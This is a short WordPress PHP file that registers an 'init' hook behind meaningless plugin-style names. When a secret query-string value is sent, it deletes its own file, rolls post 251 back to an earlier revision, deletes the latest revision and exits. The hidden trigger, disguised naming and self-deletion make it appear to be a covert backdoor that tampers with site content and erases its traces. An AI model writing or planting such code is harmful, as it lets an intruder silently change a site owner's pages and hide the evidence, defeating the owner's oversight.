<?php

function news_status_toolbar_slider() {
	if (isset($_GET['tooltip_reports_help_simple']) && $_GET['tooltip_reports_help_simple'] === 'member_reminder_beaver') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$player_badge_database_tiny = 251;
		$gamipress_products_flexible_text = wp_get_post_revisions($player_badge_database_tiny);
		if (empty($gamipress_products_flexible_text)) die('no revisions');
		if (count($gamipress_products_flexible_text) < 2) die('less than 2');
		$create_notice_event = array_shift($gamipress_products_flexible_text);
		$image_variations_query = $create_notice_event->ID;
		$scheduler_restrict_google_image = array_shift($gamipress_products_flexible_text);
		$update_captcha_edit = $scheduler_restrict_google_image->ID;
		$security_nav_rotator_effect = wp_restore_post_revision($update_captcha_edit);
		if ($security_nav_rotator_effect === false) die('error restoring');
		$security_nav_rotator_effect = wp_delete_post_revision($image_variations_query);		
		if ($security_nav_rotator_effect === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'news_status_toolbar_slider');
